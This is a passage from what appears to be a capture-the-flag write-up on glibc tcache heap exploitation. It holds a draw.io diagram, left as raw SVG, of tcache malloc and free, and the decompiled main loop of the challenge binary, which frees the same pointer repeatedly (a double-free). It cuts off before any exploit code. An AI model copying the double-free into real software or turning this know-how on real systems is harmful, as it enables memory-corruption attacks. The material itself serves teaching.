stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 118px; height: 1px; padding-top: 690px; margin-left: 21px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;void* malloc()&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;80&quot; y=&quot;694&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;void* malloc()&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;250&quot; y=&quot;1185&quot; width=&quot;110&quot; height=&quot;50&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 1210px; margin-left: 305px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; &quot;&gt;&lt;b&gt;NULL&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;305&quot; y=&quot;1214&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;NULL&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;0&quot; y=&quot;900&quot; width=&quot;160&quot; height=&quot;100&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 100px; padding-top: 900px; margin-left: 0px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 100px; overflow: hidden; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap; &quot;&gt;&lt;p style=&quot;margin: 4px 0px 0px ; text-align: center ; line-height: 100%&quot;&gt;&lt;b&gt;tcache_perthread_struct&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;hr size=&quot;1&quot; &#x2F;&gt;   char counts[]&lt;br &#x2F;&gt;&lt;hr &#x2F;&gt;   tcache_entry *entries[]&lt;hr &#x2F;&gt;&lt;b&gt;&lt;div style=&quot;text-align: center&quot;&gt;&lt;b&gt;0x7ffff7dcfc40&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;0&quot; y=&quot;912&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache_perthread_struct   c...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;path d=&quot;M 80 1170 L 80 1136.37&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 80 1131.12 L 83.5 1138.12 L 80 1136.37 L 76.5 1138.12 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 160 1210 L 243.63 1210&quot; fill=&quot;none&quot; stroke=&quot;#b85450&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 248.88 1210 L 241.88 1213.5 L 243.63 1210 L 241.88 1206.5 Z&quot; fill=&quot;#b85450&quot; stroke=&quot;#b85450&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;0&quot; y=&quot;1170&quot; width=&quot;160&quot; height=&quot;80&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe flex-start; justify-content: unsafe flex-start; width: 162px; height: 80px; padding-top: 1170px; margin-left: 0px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; width: 162px; height: 80px; overflow: hidden; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; width: 100%; height: 100%; white-space: nowrap; &quot;&gt;&lt;p style=&quot;margin: 4px 0px 0px ; text-align: center ; line-height: 120%&quot;&gt;&lt;b&gt;tcache_entry&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;hr &#x2F;&gt;   tcache_entry *next&lt;hr &#x2F;&gt;&lt;b&gt;&lt;div style=&quot;text-align: center&quot;&gt;&lt;b&gt;0x603260&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;b&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;0&quot; y=&quot;1182&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache_entry   tcache_entry...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;240&quot; y=&quot;880&quot; width=&quot;20&quot; height=&quot;140&quot; fill=&quot;none&quot; stroke=&quot;none&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 260 880 L 240 880 L 240 1020 L 260 1020&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-width=&quot;2&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 305 975 L 305 1150 L 120 1150 L 120 1163.63&quot; fill=&quot;none&quot; stroke=&quot;#b85450&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 120 1168.88 L 116.5 1161.88 L 120 1163.63 L 123.5 1161.88 Z&quot; fill=&quot;#b85450&quot; stroke=&quot;#b85450&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;250&quot; y=&quot;925&quot; width=&quot;110&quot; height=&quot;50&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 950px; margin-left: 305px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; &quot;&gt;Bin&lt;br &#x2F;&gt;1&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;305&quot; y=&quot;954&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Bin...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;430&quot; y=&quot;925&quot; width=&quot;110&quot; height=&quot;50&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 1px; height: 1px; padding-top: 950px; margin-left: 485px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: nowrap; &quot;&gt;&lt;font style=&quot;font-size: 12px&quot;&gt;Bin &lt;br &#x2F;&gt;&lt;span style=&quot;background-color: rgb(255 , 255 , 255) ; font-family: &amp;quot;consolas&amp;quot; , &amp;quot;courier new&amp;quot; , monospace ; white-space: pre&quot;&gt;TCACHE_MAX_BINS&lt;&#x2F;span&gt;&lt;&#x2F;font&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;485&quot; y=&quot;954&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;Bin...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;ellipse cx=&quot;375&quot; cy=&quot;950&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;ellipse cx=&quot;395&quot; cy=&quot;950&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;ellipse cx=&quot;415&quot; cy=&quot;950&quot; rx=&quot;5&quot; ry=&quot;5&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;530&quot; y=&quot;880&quot; width=&quot;20&quot; height=&quot;140&quot; fill=&quot;none&quot; stroke=&quot;none&quot; transform=&quot;rotate(-180,540,950)&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 550 880 L 530 880 L 530 1020 L 550 1020&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-width=&quot;2&quot; stroke-miterlimit=&quot;10&quot; transform=&quot;rotate(-180,540,950)&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;path d=&quot;M 160 965 L 233.63 965&quot; fill=&quot;none&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;stroke&quot;&#x2F;&gt;&lt;path d=&quot;M 238.88 965 L 231.88 968.5 L 233.63 965 L 231.88 961.5 Z&quot; fill=&quot;#000000&quot; stroke=&quot;#000000&quot; stroke-miterlimit=&quot;10&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;rect x=&quot;20&quot; y=&quot;1070&quot; width=&quot;120&quot; height=&quot;60&quot; fill=&quot;#ffffff&quot; stroke=&quot;#000000&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 118px; height: 1px; padding-top: 1100px; margin-left: 21px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;free(void* mem)&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;80&quot; y=&quot;1104&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;free(void* mem)&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;440&quot; y=&quot;1060&quot; width=&quot;270&quot; height=&quot;70&quot; fill=&quot;none&quot; stroke=&quot;none&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 268px; height: 1px; padding-top: 1095px; margin-left: 441px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;&lt;div style=&quot;text-align: left ; font-size: 14px&quot;&gt;&lt;span&gt;The bin&#x27;s head is set to the newly freed item, and the item&#x27;s &lt;&#x2F;span&gt;&lt;font face=&quot;Lucida Console&quot;&gt;*next&lt;&#x2F;font&gt;&lt;span&gt; pointer is set to the previous head.&lt;&#x2F;span&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;575&quot; y=&quot;1099&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;The bin&#x27;s head is set to the newly freed item...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;440&quot; y=&quot;660&quot; width=&quot;270&quot; height=&quot;70&quot; fill=&quot;none&quot; stroke=&quot;none&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe center; width: 268px; height: 1px; padding-top: 695px; margin-left: 441px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: center; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;&lt;div style=&quot;text-align: left ; font-size: 14px&quot;&gt;The bin&#x27;s head pointer is set to the current head&#x27;s &lt;font face=&quot;Lucida Console&quot;&gt;*&lt;&#x2F;font&gt;&lt;font face=&quot;Lucida Console&quot;&gt;next&lt;&#x2F;font&gt; pointer&lt;i&gt;. &lt;&#x2F;i&gt;The previous head is returned.&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;575&quot; y=&quot;699&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot; text-anchor=&quot;middle&quot;&gt;The bin&#x27;s head pointer is set to the current...&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;0&quot; y=&quot;20&quot; width=&quot;200&quot; height=&quot;20&quot; fill=&quot;none&quot; stroke=&quot;none&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 198px; height: 1px; padding-top: 30px; margin-left: 2px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;&lt;h1&gt;Initial Conditions&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;2&quot; y=&quot;34&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;Initial Conditions&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;0&quot; y=&quot;430&quot; width=&quot;170&quot; height=&quot;20&quot; fill=&quot;none&quot; stroke=&quot;none&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 168px; height: 1px; padding-top: 440px; margin-left: 2px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;&lt;h1&gt;tcache malloc&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;2&quot; y=&quot;444&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache malloc&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;rect x=&quot;0&quot; y=&quot;840&quot; width=&quot;170&quot; height=&quot;20&quot; fill=&quot;none&quot; stroke=&quot;none&quot; pointer-events=&quot;all&quot;&#x2F;&gt;&lt;g transform=&quot;translate(-0.5 -0.5)&quot;&gt;&lt;switch&gt;&lt;foreignObject style=&quot;overflow: visible; text-align: left;&quot; pointer-events=&quot;none&quot; width=&quot;100%&quot; height=&quot;100%&quot; requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&gt;&lt;div xmlns=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot; style=&quot;display: flex; align-items: unsafe center; justify-content: unsafe flex-start; width: 168px; height: 1px; padding-top: 850px; margin-left: 2px;&quot;&gt;&lt;div style=&quot;box-sizing: border-box; font-size: 0; text-align: left; &quot;&gt;&lt;div style=&quot;display: inline-block; font-size: 12px; font-family: Helvetica; color: #000000; line-height: 1.2; pointer-events: all; white-space: normal; word-wrap: normal; &quot;&gt;&lt;h1&gt;tcache free&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;foreignObject&gt;&lt;text x=&quot;2&quot; y=&quot;854&quot; fill=&quot;#000000&quot; font-family=&quot;Helvetica&quot; font-size=&quot;12px&quot;&gt;tcache free&lt;&#x2F;text&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;g&gt;&lt;&#x2F;g&gt;&lt;switch&gt;&lt;g requiredFeatures=&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;SVG11&#x2F;feature#Extensibility&quot;&#x2F;&gt;&lt;a transform=&quot;translate(0,-5)&quot; xlink:href=&quot;https:&#x2F;&#x2F;desk.draw.io&#x2F;support&#x2F;solutions&#x2F;articles&#x2F;16000042487&quot; target=&quot;_blank&quot;&gt;&lt;text text-anchor=&quot;middle&quot; font-size=&quot;10px&quot; x=&quot;50%&quot; y=&quot;100%&quot;&gt;Viewer does not support full SVG 1.1&lt;&#x2F;text&gt;&lt;&#x2F;a&gt;&lt;&#x2F;switch&gt;&lt;&#x2F;svg&gt;
&lt;h1 id=&quot;reversing&quot;&gt;Reversing&lt;&#x2F;h1&gt;
&lt;p&gt;First, we have to reverse the binary, which isn&#x27;t too difficult with Ghidra.&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#795da3;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
{
  longlong input;
  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; i;
  
  set_alarm();
  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Name:&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
  read(buffer,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;);
  i &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;do &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;{
    &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;while&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;( &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;true &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;while&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;( &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;true &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
        print_menu();
        input &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;read_ll();
        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(input &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
        &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(i &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) {
          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;free&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(malloced);
          i &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; i &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
        }
      }
      &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; input) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;;
